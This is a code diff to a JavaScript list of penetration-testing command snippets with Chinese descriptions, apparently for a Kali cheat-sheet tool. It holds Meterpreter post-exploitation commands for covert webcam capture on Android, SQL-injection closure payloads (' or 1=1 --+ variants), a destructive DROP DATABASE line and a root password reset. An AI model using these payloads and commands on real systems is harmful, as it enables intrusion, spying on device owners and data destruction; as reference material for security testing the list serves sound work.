@@ -221,6 +221,7 @@
       //
       { command: 'nmap -sn #IP# -oX eg.xml', description: '将目标的存活信息导出到一个eg.xml文件中供metasploit数据库使用'},
       { command: 'nmap -sV -p- -Pn -O #IP# -oX eg.xml', description: '将目标的端口以及版本以及服务信息导出到一个eg.xml文件中供metasploit数据库使用'},
+      //
       
       //ssh命令
       { command: 'ssh root@#IP#', description: '通过SSH连接到目标IP' },
@@ -234,7 +235,8 @@
       { command: 'systemctl restart networking', description: 'kali凯丽IP修改后重启网卡' },
       { command: 'systemctl start NetworkManager', description: 'kali凯丽IP修改后启动网络管理服务' },
       //日常命令
-
+      { command: 'cat /var/spool/cron/root', description: '查看root用户的计划任务' },
+       
       //安卓后渗透命令
       { command: 'getuid', description: '显示当前Meterpreter会话所使用的用户标识符，确认是否以管理员权限运行。-安卓后渗透命令' },
       { command: 'webcam_snap -i 2', description: '使用前置摄像头拍照-安卓后渗透命令' },
@@ -258,8 +260,22 @@
       { command: '[ "$(id -u)" -eq 0 ] || { echo "You must be root to run the script"; exit 1; }', description: '检查是否是root用户' },   
       { command: 'nohup ./frps -c frps.ini &disown', description: '后台运行某个服务程序，ssh断开后会继续运行' },   
 
+      //数据库操作命令
+      { command: 'mysql -u root -p', description: '登录数据库-数据库操作命令' },
+      { command: 'DROP DATABASE test;', description: '删除数据库-数据库操作命令' },
+      { command: 'show databases;', description: '查询展示数据库-数据库操作命令' },
+      { command: 'use mysql;', description: '使用数据库-数据库操作命令' },
+      { command: 'UPDATE user SET password=PASSWORD(\'123456\') WHERE User=\'root\' AND Host=\'localhost\';', description: '重置数据库密码-数据库操作命令' },      
+      { command: 'desc users;', description: '查看 users 数据表的结构-数据库操作命令' },    
+      { command: '?id=1\\', description: '查看闭合点-数据库操作命令' },     
+       { command: ' or 1=1 --+', description: '闭合方式1-数据库操作命令' },         
+       { command: '\' or 1=1 --+', description: '闭合方式2-数据库操作命令' }, 
+       { command: '\'\' or 1=1 --+', description: '闭合方式3-数据库操作命令' }, 
+       { command: '\) or 1=1 --+', description: '闭合方式4-数据库操作命令' }, 
+       { command: '\') or 1=1 --+', description: '闭合方式5-数据库操作命令' }, 
+       { command: '\'\') or 1=1 --+', description: '闭合方式6-数据库操作命令' }, 
+       { command: '\'\')) or 1=1 --+', description: '闭合方式7-数据库操作命令' }, 
 
-      
 
 
       //kali修改代理配置
